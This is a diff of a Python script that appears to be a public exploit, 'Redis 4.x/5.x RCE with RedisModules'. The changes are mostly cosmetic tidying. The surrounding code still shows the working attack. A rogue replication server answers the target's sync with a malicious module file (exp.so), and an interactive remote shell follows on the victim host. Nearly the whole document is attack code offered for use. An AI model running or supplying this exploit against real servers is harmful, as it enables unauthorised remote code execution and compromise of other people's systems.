@@ -1,7 +1,8 @@
 #!/usr/bin/env python
-#coding: utf:8
+# coding: utf:8
 import socket
 import os
+import sys
 from time import sleep
 import argparse
 from six.moves import input
@@ -14,8 +15,10 @@ LOGO = R"""
 █  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
   █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
  ▀                                     ▀                   
-                                                           
+
 """
+
+
 def mk_cmd_arr(arr):
     cmd = ""
     cmd += "*" + str(len(arr))
@@ -25,30 +28,39 @@ def mk_cmd_arr(arr):
     cmd += "\r\n"
     return cmd
 
+
 def mk_cmd(raw_cmd):
     return mk_cmd_arr(raw_cmd.split(" "))
+
 
 def din(sock, cnt):
     msg = sock.recv(cnt)
     if verbose:
+        if sys.version_info < (3, 0):
+            msg = repr(msg)
         if len(msg) < 300:
             print("\033[1;34;40m[->]\033[0m {}".format(msg))
         else:
             print("\033[1;34;40m[->]\033[0m {}......{}".format(msg[:80], msg[-80:]))
     return msg.decode()
 
+
 def dout(sock, msg):
     if type(msg) != bytes:
         msg = msg.encode()
     sock.send(msg)
     if verbose:
+        if sys.version_info < (3, 0):
+            msg = repr(msg)
         if len(msg) < 300:
             print("\033[1;32;40m[<-]\033[0m {}".format(msg))
         else:
             print("\033[1;32;40m[<-]\033[0m {}......{}".format(msg[:80], msg[-80:]))
 
+
 def decode_shell_result(s):
     return "\n".join(s.split("\r\n")[1:-1])
+
 
 class Remote:
     def __init__(self, rhost, rport):
@@ -76,6 +88,7 @@ class Remote:
         buf = self.recv()
         return buf
 
+
 class RogueServer:
     def __init__(self, lhost, lport):
         self._host = lhost
@@ -94,7 +107,7 @@ class RogueServer:
             resp = "+OK" + CLRF
             phase = 2
         elif data.find("PSYNC") > -1 or data.find("SYNC") > -1:
-            resp = "+FULLRESYNC " + "Z"*40 + " 0" + CLRF
+            resp = "+FULLRESYNC " + "Z" * 40 + " 0" + CLRF
             resp += "$" + str(len(payload)) + CLRF
             resp = resp.encode()
             resp += payload + CLRF.encode()
@@ -117,6 +130,7 @@ class RogueServer:
             if phase == 3:
                 break
 
+
 def interact(remote):
     print("\033[92m[+]\033[0m Received backconnect, use exit to exit...")
     try:
@@ -131,6 +145,7 @@ def interact(remote):
                     print(l)
     except KeyboardInterrupt:
         return
+
 
 def runserver(rhost, rport, lhost, lport):
     print("[*] Listening on {}:{}".format(lhost, lport))
@@ -165,7 +180,6 @@ def runserver(rhost, rport, lhost, lport):
     remote.close()
 
 
-
 def main():
     parser = argparse.ArgumentParser(description='Redis 4.x/5.x RCE with RedisModules')
     parser.add_argument("-r", "--rhost", dest="rhost", type=str, help="target host", required=True)
@@ -175,17 +189,21 @@ def main():
                         help="rogue server ip", required=True)
     parser.add_argument("-P", "--lport", dest="lport", type=int,
                         help="rogue server listen port, default 21000", default=21000)
-    parser.add_argument("-f", "--file", type=str,help="RedisModules to load, default exp.so", default='exp.so')
-    parser.add_argument("-v","--verbose", action="store_true", help="show more info", default=False)
+    parser.add_argument("-f", "--file", type=str, help="RedisModules to load, default exp.so", default='exp.so')
+    parser.add_argument("-v", "--verbose", action="store_true", help="show more info", default=False)
     options = parser.parse_args()
-    #runserver("127.0.0.1", 6379, "127.0.0.1", 21000)
+    # runserver("127.0.0.1", 6379, "127.0.0.1", 21000)
 
     print("[*] Connecting to  {}:{}...".format(options.rhost, options.rport))
     global payload, verbose, filename
     filename = options.file
     verbose = options.verbose
     payload = open(filename, "rb").read()
-    runserver(options.rhost, options.rport, options.lhost, options.lport)
+    try:
+        runserver(options.rhost, options.rport, options.lhost, options.lport)
+    except:
+        print("[-] Error, exit..")
+
 
 if __name__ == '__main__':
     print(LOGO)
